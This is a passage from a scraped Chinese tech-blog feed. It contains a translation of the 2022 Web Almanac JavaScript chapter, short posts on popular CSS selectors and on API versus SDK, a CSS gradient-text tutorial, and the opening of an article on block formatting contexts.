令人欣慰的是，目前有 12% 的移动和桌面页面使用一个或多个 Web Worker 来减轻可能使用户体验变差的主要工作线程——但还有很大的改进空间。 如果您有大量工作可以在不直接访问 DOM 的情况下完成，那么使用 Web worker 是一个好主意。虽然您必须使用 专门的通信管道 将数据传输到网络工作者或从网络工作者传输数据，但完全有可能通过使用该技术使您的网页对用户输入的响应更快。 但是，该通信管道的设置和使用可能很棘手，尽管有一些开源解决方案可以简化此过程。comlink 就是一个这样的库，它可以帮助解决这个问题，并且可以使开发人员在 Web 工作者周围的体验更加愉快。 无论你是自己管理 Web worker 还是使用库管理，关键是：如果你有昂贵的工作要做，判断是否需要在主线程上进行，如果不需要，强烈考虑使用 Web worker 来制作您网站的用户体验尽可能好。 Worklet Worklet 是一种特殊类型的工作程序，它允许对绘制和音频处理等任务的渲染管道进行较低级别的访问。虽然有四种类型的工作集，但目前在浏览器中可用的实现只有两种————绘制工作集 和 音频工作集。Worklet 的一个显着性能优势是它们在自己的线程上运行，从而将主线程从昂贵的绘图和音频处理工作中解放出来。 由于 Worklet 是这样的特殊类型技术，因此它们没有被广泛使用也就不足为奇了。Paint Worklet 是将生成艺术品的昂贵处理工作转移到另一个线程上的绝佳方式——更不用说为用户体验增添一点天赋的伟大技术了。对于每 100 万个网站，其中只有 13 个使用 Paint Worklet。 音频工作集的采用率更低：百万分之四的网站使用它。随着时间的推移，这些技术的采用趋势将如何变化，这将是一件有趣的事情。 JavaScript 是如何交付的？ JavaScript 性能的一个同样重要的方面是我们如何向浏览器提供脚本，其中包括一些常见但有时会错过的优化机会，从我们如何压缩 JavaScript 开始。 压缩 压缩是一种常用的技术，主要适用于基于文本的资源，例如 HTML、CSS、SVG 图像，当然还有 JavaScript。有多种压缩技术在网络上广泛使用，可以加快脚本向浏览器的传递，有效缩短资源加载阶段。 JavaScript 压缩方式。 有一些压缩技术可用于减少脚本的传输大小，其中 Brotli (br) 方法是最有效的。尽管 Brotli 在现代浏览器中提供了出色的支持，但很明显 gzip 是最受青睐的压缩方法。这可能是由于许多 Web 服务器将其用作默认设置。 当某些东西是默认值时，该默认值有时会保持不变，而不是被调整以获得更好的性能。鉴于观察到的页面中只有 34% 使用 Brotli 压缩脚本，很明显有机会提高脚本资源的加载性能，但也值得注意的是，与去年 30% 的采用率相比，这是一个改进。 主机上的脚本资源压缩方式。 第三方脚本提供商使问题变得更糟，他们仍然比 Brotli 更广泛地部署 gzip 压缩，分别为 60% 和 29%。鉴于第三方 JavaScript 在当今网络上是一个严重的性能问题，因此可以通过使用 Brotli 部署第三方资源来减少这些资源的资源加载时间。 主机上未压缩的资源。 值得庆幸的是，我们看到它主要是最小的资源，特别是那些负载小于 5 KB 的第三方脚本，它们是在没有压缩的情况下交付的。这是因为压缩在应用于小资源时会产生收益递减，事实上，动态压缩的额外开销可能会导致资源交付延迟。不幸的是，有一些机会可以压缩更大的资源，例如一些负载超过 100 KB 的第一方脚本。 始终检查您的压缩设置，以确保您通过网络交付尽可能小的脚本有效负载，并记住：压缩加速资源交付。这些脚本一旦交付给浏览器，就会被解压缩，并且它们的处理时间不会因压缩而改变。压缩不是提供大量脚本有效负载的好借口，这可能会使启动期间的交互性变得更糟。 简化 文本资源的简化是一种经过时间考验的减小文件大小的做法。这种做法包括从源代码中删除所有不必要的空格和注释，以减少它们的传输大小。另一个称为 uglification 的步骤应用于 JavaScript，它将脚本中的所有变量、类名和函数名简化为更短、不可读的符号。Lighthouse 的 Minify JavaScript审计检查未简化的 JavaScript。 未简化的 JavaScript 审计得分分布。 这里，0.00 代表最差分数，而 1.00 代表最好分数。在 Lighthouse 的精简 JavaScript 审核中，68% 的移动页面得分在 0.9 到 1.0 之间，而桌面页面的得分为 79%。这意味着在移动设备上，32% 的页面有机会发布简化的 JavaScript，而桌面页面的这一数字为 21%。 未简化的 JavaScript 的可节省大小。 在中间值上，我们看到页面发送的 JavaScript 大小约为 12 KB，可以简化。然而，当我们到达第 75 个和第 90 个百分位数时，这个数字会跳跃很多，从 34 KB 增加到大约 76 KB。第三方在整个过程中都非常好，直到我们达到第 90 个百分位，然而，他们发送大约 19 KB 的未压缩 JavaScript。 未简化的 JavaScript 平均浪费的字节数。 鉴于我们刚刚提供的数据，当您查看平均值时，未压缩 JavaScript 浪费的字节数并不足为奇。第一方绝大多数是交付未压缩 JavaScript 的最大罪魁祸首，占比略高于 80%。其余的略低于 20%，可以做更多的事情来通过网络传输更少的字节。 简化解决了 Web 性能的首要原则之一：发送更少的字节。如果您未通过 Lighthouse 对未精简 JavaScript 的审核，请检查您的打包器的配置，以确保您的第一方代码尽可能地简化生产。如果您注意到未简化的第三方脚本，可能是时候与该供应商沟通，看看他们能做些什么来修复它。请参阅 第三方 章节，以更深入地了解网络上第三方的状态。 Source maps 源映射 是 Web 开发人员用来将简化和压缩的生产代码映射到其原始源的工具。源映射用于生产 JavaScript 文件，是一种有用的调试工具。源映射可以在指向资源末尾源映射文件的注释中指定，也可以作为 SourceMap HTTP 响应标头指定。 通过移动设备访问的 14% 的 JavaScript 资源将源映射注释传递到可公开访问的源映射，而通过桌面设备访问的 15% 的 JavaScript 资源提供它们。但是，对于使用源映射 HTTP 标头的页面来说，情况就大不相同了。 移动设备上只有 0.12% 的 JavaScript 资源请求使用源映射 HTTP 标头，而桌面设备的这一数字为 0.07%。 从性能的角度来看，这并不意味着什么。源映射是一种开发人员体验增强功能。但是，您应该避免使用内联源映射，它将原始源的 base64 表示插入到生产就绪的 JavaScript 资产中。内联源映射意味着您不仅将 JavaScript 资源发送给用户，还发送给用户的源映射，这可能导致 JavaScript 资产过大，需要更长的时间来下载和处理。 响应能力 JavaScript 影响的不仅仅是启动性能。当我们依赖 JavaScript 提供交互性时，这些交互是由需要时间执行的事件处理程序驱动的。根据交互的复杂性和驱动它们所涉及的脚本数量，用户可能会遇到输入响应不佳的情况。 指标 许多指标用于评估实验室和现场的响应能力，Lighthouse、Chrome UX Report (CrUX) 和 HTTP Archive 等工具跟踪这些指标，以提供当今网站当前响应状态的数据驱动视图. 除非另有说明，否则以下所有图表均描述了原始级别的该指标的第 75 个百分位（Core Web Vitals 确定通过的阈值） 。 其中第一个是 首次输入延迟 (FID)，它记录了与页面进行的第一次交互的输入延迟。输入延迟是用户与页面交互与该交互的事件处理程序开始运行之间的时间。它被认为是一种负载响应指标，侧重于用户在与网站交互时获得的第一印象。 网站的第 75 个百分位 FID 值分布。 此图表显示了所有网站的第 75 个百分位 FID 值的分布。对于至少 75% 的桌面和手机用户体验，中位网站的 FID 值为 0 毫秒。这种“完美的 FID”体验甚至延伸到 75% 的网站。只有当我们到达第 90 个百分位时，我们才开始看到不完美的 FID 值，但只有 25 毫秒。 鉴于“良好”的 FID 阈值为 100 毫秒，我们可以说至少 90% 的网站符合此标准。事实上，我们从 性能 一章中所做的分析得知，100% 的网站实际上在桌面设备上具有“良好”的 FID 体验，而在移动设备上这一比例为 92%。FID 是一个异常宽松的指标。 网站的第 75 个百分位 INP 值分布。 但是，为了全面了解整个页面生命周期中的页面响应能力，我们需要查看 与下一次绘制 (INP) 的交互，它评估与页面进行的所有键盘、鼠标和触摸交互并选择高百分比旨在表示整体页面响应能力的交互延迟。 考虑一个“好”的 INP 分数是 200 毫秒 或更短。在中位数，移动和桌面的得分都低于这个阈值，但第 75 个百分位是另一回事，移动和桌面细分市场都在“需要改进”的范围内。该数据与 FID 完全不同，它表明网站有很多机会尽其所能在页面上运行更少的 长任务，这是导致 INP 分数不太好的关键因素。 页面上的基于实验室的 TBT 值分布。 与长任务相吻合，有 总阻塞时间（TBT） 指标，它计算启动期间长任务的总阻塞时间。 请注意，与前面关于 FID 和 INP 的统计数据不同，TBT 和 TTI（如下）并非来自真实用户数据。相反，我们正在 模拟 桌面和移动环境中测量合成性能，并启用了适合设备的 CPU 和网络节流。由于这种方法，我们为每个页面获得了一个 TBT 和 TTI 值，而不是整个网站的真实用户值分布。 考虑到 INP 与 TBT 的相关性非常好，可以合理地假设高 TBT 分数可能会产生较差的 INP 分数。使用我们的综合方法，我们看到台式机和移动设备之间存在巨大差距，这表明具有更好处理能力和内存的台式机设备的性能大大优于功能较弱的移动设备。在第 75 个百分位，页面有近 3.6 秒的阻塞时间，这被认为是糟糕的体验。 按来源和百分位数的 TTI 得分分布。 最后，我们来看看 交互时间 (TTI)，如果指标在 5 秒内出现，则认为这是“好”的。鉴于只有第 10 个百分位几乎没有滑到 5 秒以下，我们模拟环境中的大多数网站都依赖 JavaScript，以至于页面无法在合理的时间范围内变得交互——尤其是第 90 个百分位，这需要惊人的时间 41.2 秒变为互动。 长任务/阻塞时间 正如您可能从上一节中了解到的，交互响应能力差的主要原因是任务太长。澄清一下，长任务是在主线程上运行超过 50 毫秒的任何任务。超过50毫秒的任务长度就是该任务的阻塞时间，可以通过从任务的总时间中减去50毫秒来计算。 长任务是一个问题，因为它们会阻止主线程执行任何其他工作，直到该任务完成。当一个页面有很多长任务时，浏览器会觉得响应用户输入很慢。在极端情况下，甚至感觉浏览器根本没有响应。 每页的长任务数分布。 中间页面在移动设备上遇到 19 个长任务，在桌面设备上遇到 7 个长任务。当您考虑到大多数桌面设备比移动设备具有更大的处理能力和内存资源并且主动冷却时，这是有道理的。 然而，在较高的百分位数时情况会变得更糟。每页第 75 个百分位的长任务在移动设备和桌面设备上分别为 32 和 12。 每页的长任务时长分布。 仅仅知道每页有多少长任务是不够的——我们需要了解这些任务在页面上占用的总时间。移动页面的中位数有 3.59 秒的时间专门用于长任务，而桌面页面的时间要少得多，为 0.74 秒。 对于移动设备上的用户来说，第 75 个百分位的情况要糟糕得多，每页专门用于处理长任务的处理时间接近 6.6 秒。这是浏览器花费大量时间在可以优化甚至可能转移到不同线程上的网络工作者的紧张工作上。无论如何，这些结果都会给移动网络和响应能力带来麻烦。 Scheduler API 调度 JavaScript 任务在历史上一直推迟到浏览器上。有一些新的方法，如 requestIdleCallback 和 queueMicrotask，但这些 API 以粗略的方式安排任务，特别是在如果 queueMicrotask 被滥用的情况下，可能会导致性能问题。 Scheduler API 最近发布了，它使开发人员可以根据优先级更好地控制调度任务——尽管它目前仅限于基于 Chromium 的浏览器。 目前只有百万分之 20 (0.002%) 的移动页面使用 Scheduler API 的 JavaScript，而百万分之 30 (0.003%) 的桌面页面使用。这并不奇怪，考虑到缺乏关于这个非常新的特性的文档，以及它的有限支持。但是，我们预计随着该功能的文档可用，这个数字会增加，尤其是在框架中使用它时。我们相信，采用这一重要的新功能最终将带来更好的用户体验结果。 同步 XHR AJAX — 或使用 XMLHttpRequest (XHR) 方法在没有导航请求的情况下异步检索数据和更新页面信息 — 是一种非常流行的创建动态用户体验的方法。它在很大程度上已被异步 fetch 方法所取代，但所有主流浏览器仍然支持 XHR。 XHR 有一个标志，允许您发出同步请求。同步 XHR 对性能有害，因为事件循环和主线程在请求完成之前被阻塞，导致页面挂起，直到数据可用。 fetch 是一种更有效和更高效的替代方案，具有更简单的 API，并且不支持同步获取数据。 虽然同步 XHR 仅用于 2.5% 的移动页面和 2.8% 的桌面页面，但其继续使用（无论多么小）仍然表明一些遗留应用程序可能依赖这种损害用户体验的过时方法。 避免使用同步 XHR 和一般的 XHR。fetch 是一种更符合人体工程学的替代方案，在设计上就没有同步功能。如果没有同步 XHR，您的页面会表现得更好，我们希望有一天能看到这个数字降到零。 document.write 在引入 DOM 插入方法（例如 appendChild 和其他方法）之前，document.write 被用来在文档中插入内容。 document.write 是非常有问题的。首先，它阻塞了 HTML 解析器，而且由于其他一些原因，HTML 规范本身也警告不要使用它。在慢速连接中，以这种方式阻塞文档解析以追加节点，会产生完全可以避免的性能问题。 令人惊讶的是，18% 的页面仍在使用 document.write 向 DOM 添加内容而不是使用正确的插入方法，而 17% 的桌面页面仍在这样做。对此的解释可能是遗留应用程序没有被重写以使用首选的 DOM 方法将新节点插入到文档中，甚至是一些仍在使用它的第三方脚本。 我们希望看到这种趋势有所下降。所有主流浏览器都明确警告不要使用这种方法。虽然它还没有被弃用，但它在未来几年在浏览器中的存在并不能保证。如果您的网站中有 document.write 调用，则应优先考虑尽快将其删除。 遗留的 JavaScript 在过去的几年里，JavaScript 有了很大的发展。新的语言特性的引入使 JavaScript 成为一种能力更强、更优雅的语言，帮助开发人员编写更简洁的 JavaScript，从而减少 JavaScript 的加载量--前提是这些特性没有被 Babel 等转码器不必要地转化为传统语法。 Lighthouse 目前会检查那些在现代网络中可能不必要的 Babel 转换，例如转换 async 和 await 的使用、JavaScript 类，以及其他较新但被广泛支持的语言特性。 超过三分之二的移动页面正在传送正在转换的 JavaScript 资源，或者包含不必要的旧版 JavaScript。 为了兼容性，转换可以为生产 JavaScript 添加大量额外字节，但除非有必要支持旧版浏览器，否则其中许多转换是不必要的，并且会损害启动性能。如此多的移动页面（以及 68% 的桌面页面）正在交付这些转换，这令人担忧。 Babel 为解决这个问题做了很多开箱即用的工作，例如通过 编译器假设功能，但 Babel 仍然由用户定义的配置驱动，并且只能在存在过时的配置文件的情况下做这么多。 如上所述，我们强烈建议开发人员仔细检查他们的 Babel 和 Browserslist 配置，以确保对代码应用最少的转换，以便它们在所需的浏览器中工作。这样做会导致发送给最终用户的字节数大大减少。开发人员在这方面有很多工作要做，我们希望看到这个数字随着时间的推移而下降，因为该语言的演变已经相对稳定。 JavaScript 是如何使用的？ 构建网页的方法不止一种。虽然有些人可能会选择直接使用 Web 平台，但不可否认的是，Web 开发人员行业的趋势是追求抽象，使我们的工作更容易进行和推理。与往年一样，我们将探索库和框架的作用，以及这些库和框架出现安全漏洞的频率，这些漏洞可能使网络成为用户面临风险的地方。 库和框架 库和框架是开发人员体验的重要组成部分——有可能通过框架开销损害性能。尽管开发人员在很大程度上接受了这种权衡，但了解 Web 上常用的库和框架非常重要，因为它有助于我们了解 Web 的构建方式。在本节中，我们将了解 2022 年 Web 上的库和框架的状态。 库的使用 为了了解库和框架的使用，HTTP Archive 使用 Wappalyzer 来检测页面上使用的技术。 顶级库和框架的使用率。 jQuery 是当今网络上使用最多的库仍然不足为奇。部分原因是 35% 的网站使用 WordPress，但即便如此，大部分 jQuery 的使用发生在 WordPress 平台之外。 虽然 jQuery 相对较小且运行速度相当快，但它仍然代表应用程序中的一定量的开销。jQuery 提供的大部分功能现在都可以通过原生 DOM API 实现，并且在当今的 Web 应用程序中可能是不必要的。 core-js 的使用也不足为奇，因为许多 Web 应用程序使用 Babel 转换其代码，Babel 经常使用 core-js 来填补跨浏览器 API 中缺失的部分。随着浏览器的成熟，这个数字应该会下降——这确实是一件好事，因为现代浏览器比以往任何时候都更有能力，而交付 core-js 代码最终可能会浪费字节。 与去年相比，React 的使用率明显保持不变，为 8%，这可能表明由于 JavaScript 生态系统中的选择越来越多，该库的采用率已经趋于平稳。 组合使用的库 在同一页面上看到使用多个框架和库的情况并不少见。与去年一样，我们将研究这一现象，以深入了解 2022 年有多少库和框架一起使用。 Libraries Desktop Mobile jQuery 10.19% 10.33% jQuery, jQuery Migrate 4.30% 4.94% core-js, jQuery, jQuery Migrate 2.48% 2.80% core-js, jQuery 2.78% 2.74% jQuery, jQuery UI 2.40% 2.07% core-js, jQuery, jQuery Migrate, jQuery UI 1.18% 1.36% jQuery, jQuery Migrate, jQuery UI 0.88% 0.99% GSAP, Lodash, Polyfill, React 0.48% 0.93% Modernizr, jQuery 0.87% 0.86% core-js 0.92% 0.85% 库和框架组合使用的百分比。 很明显，jQuery 有一些强大的持久力，它的一些组合、它的 UI 框架和它的迁移插件出现在前七名中，而 core-js 在库的使用中也扮演着突出的角色。 安全漏洞 鉴于当今 Web 上 JavaScript 的广泛传播，以及可安装 JavaScript 包的出现，JavaScript 生态系统中存在安全漏洞也就不足为奇了。 尽管 57% 的移动页面提供了易受攻击的 JavaScript 库或框架，但这一数字比去年的 64% 有所下降。这是令人鼓舞的，但要降低这个数字还有很多工作要做。我们希望随着更多安全漏洞的修补，开发人员将被激励更新他们的依赖项，以避免让他们的用户受到伤害。 Library or framework Desktop Mobile jQuery 49.12% 48.80% jQuery UI 16.01% 14.88% Bootstrap 11.53% 11.19% Moment.js 4.54% 3.91% Underscore 3.41% 3.11% Lo-Dash 2.52% 2.44% GreenSock JS 1.65% 1.62% Handlebars 1.27% 1.12% AngularJS 0.99% 0.79% Mustache 0.44% 0.57% 十大最常用的库和框架中存在已知 JavaScript 漏洞的页面的百分比。 由于 jQuery 是当今 Web 上最流行的库，因此它及其相关的 UI 框架代表了当今用户在 Web 上暴露的大量安全漏洞也就不足为奇了。这可能是因为一些开发人员仍在使用这些脚本的旧版本，这些脚本没有利用对已知漏洞的修复。 一个值得注意的条目是 Bootstrap，它是一个 UI 框架，可帮助开发人员在不直接使用 CSS 的情况下快速原型化或构建新布局。鉴于 Grid 或 Flexbox 等较新的 CSS 布局模式的发布，我们可能会看到 Bootstrap 的使用随着时间的推移而减少，或者取而代之的是，开发人员会更新他们的 Bootstrap 依赖项以发布更安全的网站。 无论您使用什么库和框架，请务必尽可能定期更新您的依赖项，以避免让您的用户受到伤害。虽然包更新确实会不时导致一些重构或代码修复，但付出的努力值得减少责任并提高用户安全性。 Web components 和 Shadow DOM 一段时间以来，Web 开发一直由众多框架采用的组件化模型驱动。Web 平台也进行了类似的发展，以通过 Web 组件和 Shadow DOM 提供对逻辑和样式的封装。为了开始今年的分析，我们将从自定义元素开始。 使用自定义元素的桌面页面的百分比 2.0% 比去年对桌面页面上自定义元素使用情况的分析有所下降，后者为 3%。凭借自定义元素提供的优势以及它们在现代浏览器中相当广泛的支持，我们希望 Web 组件模型将迫使开发人员利用 Web 平台内置功能来创建更快的用户体验。 Shadow DOM 允许您在文档中创建专用节点，这些节点包含它们自己的子元素和样式范围，从而将组件与主 DOM 树隔离开来。与去年 0.37% 的页面使用 Shadow DOM 的数字相比，该功能的采用率基本保持不变，有 0.39% 的移动页面和 0.47% 的桌面页面使用它。 template 元素帮助开发人员重用标记模式。它们的内容仅在被 JavaScript 引用时呈现。模板可以很好地与 Web 组件配合使用，因为 JavaScript 尚未引用的内容随后会使用 Shadow DOM 附加到 Shadow Root。 目前，桌面和移动设备上大约 0.05% 的网页正在使用 template 元素。尽管模板在浏览器中得到了很好的支持，但它们的采用目前还很少。 使用 is 属性的移动页面的百分比为 0.08%。HTML is 属性是将自定义元素插入页面的另一种方式。不是使用自定义元素的名称作为 HTML 标记，而是将名称传递给任何标准的 HTML 元素，该元素实现了 Web 组件逻辑。is 属性是一种使用 Web 组件的方法，如果 Web 组件未能在页面上注册，该组件仍可以退回到标准 HTML 元素行为。 这是我们跟踪此属性使用情况的第一年，不出所料，它的采用率低于自定义元素本身。由于 Safari 缺乏支持，这意味着 iOS 和 macOS 上的 Safari 无法使用该属性，这可能导致该属性的使用受限。 结论 随着 Web 平台的成熟，我们希望看到更多地直接采用它的各种 API 和功能，因为这样做是有意义的。对于那些需要框架来获得更好的开发体验的开发者，我们希望看到框架作者有更多的优化和采用新的 API 来帮助开发者产生更好的开发体验和创造出更好的用户体验。 我们期待明年向着预示趋势的转变。与此同时，我们继续尽我们所能让网络尽可能快，同时密切关注 实验室数据 和 实时数据。 原文链接 https://almanac.httparchive.org/en/2022/javascript ","link":"https://zkrisj.github.io/post/2022-javascript-nian-du-bao-gao-fan-yi/"},{"title":"2022 最受欢迎的 CSS 类名、ID 和选择器是什么","content":"介绍 CSS 是用于布局、格式化网页和其他媒体的语言。它和用于结构的 HTML 和用于行为的 JavaScript 是网络的三种主要语言。 在过去的几年中，出现了一系列新的 CSS 功能。其中许多是从开发人员已经使用 JavaScript 或预处理器所做的事情中获得灵感的，而另一些则提供了几年前不可能完成的事情的方法。提供新功能是一回事，但开发人员是否真的在他们的生产网页和应用程序中使用它们？ 类名 与 2020 年和 2021 年一样，网络上最受欢迎的类名是 active，Font Awesome 的 fa，fa-* 前缀仍然排在第二和第三。 wp-* 类名已经攀升至第四位，它们现在出现在 31% 的页面上，2021 年为 20%，这些在新的 WordPress 块编辑器中使用，还有诸如 has-large-font-size 的类名。 clearfix 已经从前 20 名中消失了，现在只出现在 10% 的页面上，这非常清楚地表明基于浮动的布局正在从网络上消失。 ID content 再次成为最流行的 ID 名称，其次是 footer 和 header。以 fb_ 开头的 ID 表示使用 Facebook 小部件。 2021，7% 的页面上出现了以 rc- 开头的 ID，表明使用了谷歌的 reCAPTCHA 系统，尽管被 Facebook 的 ID 挤出前十位，但仍然以同样的频率出现。 伪类 :hover、:focus 和 :active 用户操作伪类再次位居前三名。否定伪类 :not() 也继续流行，:root 可能用于创建自定义属性。 去年有人指出 :focus-visible，一种以更符合用户期望的方式对焦点元素进行样式设置的方法出现在不到 1% 的页面中。自 2022 年 3 月以来，该属性已在所有三个主要引擎中可用，现在在 10% 的桌面和 9% 的移动页面上都可以找到。 伪元素 我们过滤掉了任何带前缀的，特定于浏览器的伪元素，这些通常用于选择界面组件或浏览器的部分。 自去年以来，使用 ::before 和 ::after 有所增加。这些用于将生成的内容插入到文档中。通过检查 content 属性的使用，可以看到它最常用于插入空字符串，用于样式目的。生成的内容是一种无需添加元素即可设置网格区域样式的方法，也许这有助于这些属性的使用量增加。 伪元素 ::marker 使用率现在已经达到 1%，这表明人们正在慢慢开始利用选择和样式列表标记的能力。 属性选择器 最受欢迎的属性选择器是 type，出现在 54% 的页面上。然后分别是 class 37%、disabled 25% 和 dir 17% 出现在页面上的比例。 Sass 像 Sass 这样的预处理器可以被看作是开发人员使用 CSS 无法实现的一个很好的指标。但是，随着 CSS 越来越强大，开发人员的一个常见问题是我们是否还需要使用 Sass。我们可以从自定义属性使用的增加中看出，一种常见的预处理器使用是拥有变量或常量的能力——而现在有了内置的 CSS 等价物。 CSS 嵌套的未来规范目前也正在 CSS 工作组开发和讨论中。嵌套在 SCSS 表中很常见，可以通过查找 &amp; 字符来识别。 原文链接 https://almanac.httparchive.org/en/2022/css ","link":"https://zkrisj.github.io/post/2022-zui-shou-huan-ying-de-css-lei-ming-id-he-xuan-ze-qi-shi-shi-me/"},{"title":"总结了一下 API 与 SDK 之间的区别和联系","content":"API API（英语：Application Programming Interface，应用程序接口）是对程序而言的，提供编程时的接口，即一系列模块化的类和函数，而无需访问源码，或理解内部工作机制的细节。 优点：开发成本低，对接比较简单，可以快速验证商业模式和用户体验。 缺点：会经过对接平台，厂商可以获取对接平台相关数据信息，不具保密性。 API 标准化 存在一些如何定义 API 的行业标准，比如 SOAP、REST、GraphQL 等。 SDK SDK（英语：Software Development Kit, 软件开发工具包）是由第三方服务商提供的实现软件产品某项功能的工具包，包括功能（通过 API 访问）、相关库、文档、示例等。 优点：对接后的功能比较稳定，响应速度快，而且对接平台相关数据不会被获取。 缺点：需要开发的环节较多，开发工作量大，对接周期略长。 SDK 组成 接口文件和库文件 接口文件和库文件即 API ，将底层的代码进行封装保护，提供给用户一个调用底层代码的接口。 帮助文档 帮助文档用来解释接口文件和库文件的功能，以及介绍有关的开发工具、操作教程、常见问题等。 开发示例 开发示例包括 DEMO 展示，也包括源代码。 工具 工具是用来协助用户进行二次开发的，比如开发向导、API 搜索工具、软件打包工具、测试/分析工具等。 SDK 举例 使用 App 登录的时候可以选用微信、微博、QQ 等第三方进行登录，这实际上就是将你的 App 接入了第三方的登录 SDK； App 里面支持将内容分享到微信、微博、QQ 等第三方平台，这实际上就是将你的 App 接入了第三方的分享 SDK； 电商类 App 里面支持微信、支付宝、百度钱包等支付方式，这实际上就是将你的 App 接入了第三方的支付 SDK； SDK 可以自己配置或者下载第三方提供的，比如 百度的 AI 市场，提供语音识别、语音合成、文字识别、图像搜索、图像识别、图像效果增强、人体分析、人脸识别、内容审核、语言处理基础技术等 SDK 下载，开发时使用现成的 SDK，节省了研发时间。 SDK 是帮助提供商向开发人员介绍自己的产品的利器，并能鼓励他们利用其平台或 OS 来创建应用，而这可以在一个集成开发环境中实时进行。所以，大多数 SDK 是免费使用的，开发人员只需下载就能立即开始编程。 挑选 SDK 一些 SDK 可能附有相关的规则或协议，必须同意并提交后才能使用，尤其是处于 Alpha 或 Beta 阶段的新产品，或者包含不对外公开（非开源）的算法的软件。SDK 也可能受许可协议约束，因此创建的软件有可能无法在不兼容的许可证下发布。 开发人员在挑选使用哪些 SDK 进行开发时应仔细考虑上述问题。例如： 使用专有许可证的 SDK 不适合用于开发开源软件。 具有通用公共许可证（GPL） 的 SDK 不能用于专有应用。 利用较宽松公共许可证书（LGPL） 处理含有专有代码元素的项目时，应遵循相关的警告。 区别和联系 SDK 除了提供的完善的接口，还会提供相关的开发环境。而 API 需要在 SDK 环境下调用，大部分 SDK 都包含 API。比如，Java SDK（Java 开发工具包）包含了 API 程序库，编译器、运行时环境和其他杂项工具，而 Java API 只是 Java 的程序库部分。最简单的 SDK 版本可以是一个 API，其中包含一些与特定编程语言进行交互所需的文件。 很多公司都开放自己的 API，并为了用户调用方便，他们大多采用 SDK 文档方式打包。用户在调用时只需要下载该 SDK 文档，根据相应规范进行调用即可。这样就省去了重写函数去封装 http、https 等请求的工作。比如 百度 AI 文字识别平台文档。 举例，有一杯密封饮料，它的名字叫做“SDK”，饮料上插着吸管，吸管的名字叫“API”，把你叫做“XX系统”。如果你想喝到饮料（让系统拥有 SDK 中的功能），你必须通过 API 这根吸管来实现（通过 API 连接你的系统和 SDK 工具包）。所以 SDK＝你想要的软件功能的软件包，API＝SDK 上的接口。 实际开发过程中，如果只是简单功能调用，API 调用方便快捷；如果是复杂功能调用，SDK 功能齐全。 ","link":"https://zkrisj.github.io/post/zong-jie-liao-yi-xia-api-yu-sdk-zhi-jian-de-qu-bie-he-lian-xi/"},{"title":"CSS 彩色字体的实现","content":"字体一般可以通过使用字体文件来实现彩色效果，但是通过 CSS 方式也是可以实现的，下面是两种实现方法。推荐第二种方法，效果更好，样式也不容易被一些页面插件影响。 mask-image 给元素添加一个 ::after 伪元素，内容和元素一样，同时在这个伪元素上面设置一个遮罩层，而遮罩层的图像使用渐变色，然后使用绝对定位覆盖元素内容，这样可以达到改变字体颜色的效果。 &lt;h1 class=&quot;text-gradient&quot; data-text=&quot;渐变色字体&quot;&gt;渐变色字体&lt;/h1&gt; &lt;style&gt; .text-gradient { position: relative; } .text-gradient[data-text]::after { content: attr(data-text); color: cyan; position: absolute; top: 0; left: 0; mask-image: linear-gradient(to left, red, rgba(0, 0, 0, .5)); -webkit-mask-image: linear-gradient(to left, red, rgba(0, 0, 0, .5)); } &lt;/style&gt; background-clip background-clip 属性定义元素的背景图片或背景色延伸到边框（border-box）、内边距（padding-box）或裁剪至内容区（content-box）。但是它还有一个值 text 可以将背景裁剪成文字的前景色，目前各浏览器 PC 端和移动端都已支持该值，chrome 中需要加 -webkit- 前缀。该值需要配合 -webkit-text-fill-color: transparent 将元素本身字体颜色隐藏，-webkit-text-fill-color 的优先级要大于 color，所以可以确保将颜色填充覆盖元素本身的颜色。 下面例子中，使用 linear-gradient 函数设置了背景图片，也可以使用图片格式的文件。 &lt;h1 class=&quot;rainbow&quot;&gt;渐变色字体&lt;/h1&gt; &lt;style&gt; .rainbow { background: linear-gradient(to right, red, yellow, lime, aqua, blue, fuchsia) 0 / 50%; background-clip: text; -webkit-background-clip: text; -webkit-text-fill-color: transparent; } &lt;/style&gt; 使用动画 使用 filter 滤镜 hue-rotate 函数来动态改变元素内容的色调。 &lt;h1 class=&quot;rainbow&quot;&gt;渐变色字体&lt;/h1&gt; &lt;style&gt; .rainbow { background: linear-gradient(to right, red, yellow, lime, aqua, blue, fuchsia) 0 / 50%; background-clip: text; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: hue 6s infinite; } @keyframes hue { from { filter: hue-rotate(0deg); } to { filter: hue-rotate(360deg); } } &lt;/style&gt; ","link":"https://zkrisj.github.io/post/css-cai-se-zi-ti-de-shi-xian/"},{"title":"CSS 块级格式上下文（BFC）和 flow-root 布局","content":"块级格式上下文（BFC） 块格式化上下文（Block Formatting Context，BFC）是 Web 页面的可视 CSS 渲染的一部分，是块级盒子的布局过程发生的区域，也是浮动元素与其他元素交互的区域。 下列方式会创建块级格式化上下文： 根元素（&lt;html&gt;，也称为初始块格式上下文）。 浮动元素（float 值不为 none）。 绝对定位元素（position 值为 absolute 或 fixed）。 行内块元素（display 值为 inline-block）。 表格单元格（display 值为 table-cell，HTML 表格单元格默认值）。 表格标题（display 值为 table-caption，HTML 表格标题默认值）。 匿名表格单元格元素（display 值为 table、table-row、table-row-group、table-header-group、table-footer-group（分别是 HTML 元素 table、tr、tbody、thead、tfoot 的默认值）或 inline-table）。 overflow 值不为 visible、clip 的块元素。 display 值为 flow-root 的元素。 contain 值为 layout、content 或 paint 的元素。 弹性元素（display 值为 flex 或 inline-flex 元素的直接子元素），而它们本身不是 flex、grid 或 table 容器。 网格元素（display 值为 grid 或 inline-grid 元素的直接子元素），而它们本身不是 flex、grid 或 table 容器。 多列容器（column-count 或 column-width 值不为 auto，包括 column-count 为 1） column-span 值为 all 的元素始终会创建一个新的 BFC，即使该元素没有包裹在一个多列容器中。 脱离常规流的元素： floated items（浮动的元素）。 position 属性为 absolute 或者 fixed 的元素。 根元素（html）。 脱离常规流的元素会创建一个新的块级格式化上下文环境，其中包含的所有元素构成了一个小的布局环境，与页面中的其他内容分隔开来。而根元素，作为页面中所有内容的容器，自身脱离常规流，为整个文档创建了一个块级格式化上下文环境。 下面的示例中，&lt;div&gt; 中有一个浮动元素，该 div 的内容与浮动元素一起浮动。由于 float 的内容比它旁边的内容高，所以现在 div 贯穿了浮动元素。浮动元素已脱离文档流，因此 div 的背景和边框仅包含内容，而不包含浮动元素。 而如果我们在容器元素上创建一个新的 BFC，则容器将包含该浮动元素。在过去的典型方法是设置 overflow: auto（或设置其他不是 overflow: visible 的值），将自动创建包含浮动元素的新 BFC。 设置 overflow: auto 后，div 